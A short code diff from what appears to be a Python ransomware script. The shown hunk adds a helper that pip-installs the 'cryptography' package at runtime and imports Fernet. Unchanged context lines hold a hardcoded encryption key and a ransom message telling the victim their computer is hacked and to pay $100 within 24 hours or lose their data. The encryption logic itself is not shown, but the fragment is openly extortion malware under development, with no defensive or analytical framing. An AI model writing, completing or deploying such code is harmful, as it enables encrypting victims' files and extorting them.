@@ -1,6 +1,10 @@
 from genericpath import isfile
 import os
-from cryptography.fernet import Fernet , InvalidToken
+def install(package):
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+
+install('cryptography')
+from cryptography.fernet import Fernet 
 # Encryption key that can be genrated randomly by fernet libary by python
 key='7SpexdsyHOkKtPe9q7JCe384UV6E2MMjcxFgeyJZUzQ='
 warning = "HUI HUI HUI !!!!! YOUR COMPUTER IS HACKED .PAY ME 100$ with in 24 Hours to retrive your data otherwise it will be deletd permenetly"
